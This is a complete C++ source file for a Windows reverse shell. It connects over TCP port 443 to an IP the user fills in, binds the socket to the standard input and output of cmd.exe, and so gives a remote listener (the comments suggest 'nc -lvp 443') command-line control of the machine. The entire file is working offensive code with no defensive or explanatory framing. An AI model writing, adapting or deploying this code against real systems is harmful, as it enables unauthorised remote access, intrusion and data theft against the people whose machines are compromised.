// ReverseShell.cpp : Defines the entry point for the console application.
// used visual studio 2015
// setup nc listener with nc -lvp 443 on your IP 

#include "stdafx.h"
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib,"ws2_32")
WSADATA WS;
SOCKET so;
struct sockaddr_in con;
char ip[16];
STARTUPINFO SI;
PROCESS_INFORMATION PI;
int _tmain(int argc, _TCHAR* argv[])
{
WSAStartup(MAKEWORD(2, 2), &WS);
so = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL,
	    (unsigned int)NULL, (unsigned int)NULL);
con.sin_family = AF_INET;
	con.sin_port = htons(443);
con.sin_addr.s_addr = inet_addr("Put Your IP here");
WSAConnect(so,(SOCKADDR*)&con,sizeof(con),NULL,NULL,NULL,NULL);
memset(&SI, 0, sizeof(SI));
SI.cb = sizeof(SI);
	SI.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	SI.hStdInput = SI.hStdOutput = SI.hStdError = (HANDLE) so;
	TCHAR commandLine[256] = L"C:\\WINDOWS\\System32\\cmd.exe";
    CreateProcess(L"C:\\WINDOWS\\System32\\cmd.exe",NULL, NULL, NULL, true, 0, NULL, NULL, &SI, &PI);

	return 0;
}

